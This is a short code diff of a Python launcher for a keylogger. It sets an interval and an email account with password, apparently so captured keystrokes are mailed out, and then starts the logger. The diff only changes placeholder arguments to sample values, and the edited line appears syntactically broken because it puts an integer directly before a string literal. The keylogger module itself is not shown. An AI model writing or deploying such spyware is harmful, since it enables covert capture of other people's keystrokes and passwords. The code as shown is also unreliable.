@@ -1,5 +1,5 @@
 import keylogger
 
 
-my_keylogger = keylogger.Keylogger(<enter the Time in seconds>, "Enter your email Address", "Enter your email address password" )
+my_keylogger = keylogger.Keylogger(60 """time in seconds""", "Enter your email Address (example@gmail.com)", "Enter your email address password (cool12345)" )
 my_keylogger.start()
